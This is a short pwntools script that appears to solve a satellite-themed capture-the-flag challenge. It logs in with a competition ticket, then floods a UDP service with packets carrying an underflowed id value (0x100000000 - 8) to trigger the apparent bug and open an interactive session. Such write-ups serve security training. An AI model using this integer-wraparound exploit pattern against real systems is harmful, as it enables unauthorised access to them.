from pwn import *

rr = remote("lucky-tree.satellitesabove.me", 5008)
rr.sendlineafter("Ticket please:", "ticket{juliet700166sierra2:GPt3qNCcibkMGcmN-xX4IM0Cz7y4tuGVj5UNIAO1h2h0EQ_npdwjNqLhYY2Xoj76GQ}")

rr.recvuntil("Starting up Service on udp:")
ip = rr.recvuntil(":", drop=True)
port = int(rr.recvline().strip())

r = remote(ip, port, typ='udp')

def send_command(ver, typ, id):
	r.send(p16(ver) + p16(typ) + p32(id))
	print(r.clean(timeout=0).decode(), end='')

for i in range(255):
	send_command(1, 1, 0x100000000 - 8)

send_command(1, 1, 9)

r.interactive()
